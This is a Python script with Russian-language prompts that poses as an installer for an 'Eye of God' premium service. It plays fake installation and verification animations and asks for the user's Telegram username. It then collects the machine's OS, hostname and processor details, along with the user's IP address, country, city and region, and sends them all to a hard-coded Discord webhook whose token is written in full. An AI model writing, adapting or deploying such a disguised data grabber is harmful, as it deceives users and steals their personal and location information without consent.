import time
import platform
import json
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
from colorama import init, Fore

init()

WEBHOOK_URL = 'https://discord.com/api/webhooks/1274044779839225876/r9Sm7C2wCgBi7U9P2NC1A9WiIdPvZLBiElm8voCH6Ph-kvEDSNpZPn_8k-mYsJRwFf7i'

def display_installation_message():
    steps = ["Установка глаза бога 🔍", "Установка глаза бога 🛠️", "Установка глаза бога ⏳"]
    for _ in range(3):
        for step in steps:
            print(step, end="\r")
            time.sleep(1)
    print("Установка прошла ✅")
    time.sleep(4)
    print(" " * 50, end="\r")
    time.sleep(3)
    print(" " * 50, end="\r")

def get_telegram_username():
    while True:
        print(Fore.RED + "Введите ваш @username от аккаунта Telegram\nпосле скрипт добавит вас в\nсписок премиум пользователей " + Fore.BLUE + ">>>", end="")
        username = input().strip()
        if username:
            confirm_username = input("Введите ваш @username еще раз >>> ").strip()
            if username == confirm_username:
                return username
            else:
                print("Ошибка: имена не совпадают. Попробуйте снова.")
        else:
            print("Ошибка: имя не может быть пустым. Попробуйте снова.")

def display_verification_animation():
    animation_steps = ["🔍 Проверка...", "🔧 Проверка...", "✔️ Проверка завершена!"]
    for step in animation_steps:
        print(step, end="\r")
        time.sleep(0.5)

def collect_system_data(username):
    data = {
        "🖥️ Система": platform.system(),
        "🖥️ Имя узла": platform.node(),
        "🛠️ Релиз": platform.release(),
        "🔧 Версия": platform.version(),
        "💻 Машина": platform.machine(),
        "⚙️ Процессор": platform.processor(),
        "📜 Telegram Username": username
    }
    return data

def get_ip_and_location():
    try:
        response = requests.get("https://ipinfo.io")
        if response.status_code == 200:
            ip_info = response.json()
            return {
                "🌐 IP-адрес": ip_info.get("ip"),
                "🏳️ Страна": ip_info.get("country"),
                "🏙️ Город": ip_info.get("city"),
                "🗺️ Регион": ip_info.get("region"),
            }
        else:
            return {"🌐 IP-адрес": "Неизвестно", "🏳️ Страна": "Неизвестно"}
    except Exception as e:
        print(f"Ошибка при получении IP: {e}")
        return {"🌐 IP-адрес": "Неизвестно", "🏳️ Страна": "Неизвестно"}

def send_data_to_discord(data):
    try:
        webhook = DiscordWebhook(url=WEBHOOK_URL, username="Системное сообщение", avatar_url=r"https://media.discordapp.net/attachments/1258001563880788039/1269594103126167562/d9f2786116b9f9b8109141cdc3be4580.jpg?ex=66c07326&is=66bf21a6&hm=3e065d8460135dab6a769364dab51610c8bd6e57fca823a9c4f4838d8035906e&")
        description = "\n".join([f"{key}: {value}" for key, value in data.items()])
        embed = DiscordEmbed(title="💾 Данные системы", description=f"```\n{description}\n```", color='000000')
        embed.set_timestamp()
        webhook.add_embed(embed)
        webhook.execute()
        print("ошибка, больше не запускает скрипт\nвы подтвергаете свой девайс риску")
    except Exception as e:
        print(f"Ошибка при отправке данных: {e}")

def main():
    display_installation_message()
    telegram_username = get_telegram_username()
    display_verification_animation()
    system_data = collect_system_data(telegram_username)
    ip_location_data = get_ip_and_location()
    combined_data = {**system_data, **ip_location_data}
    send_data_to_discord(combined_data)

if __name__ == "__main__":
    main()
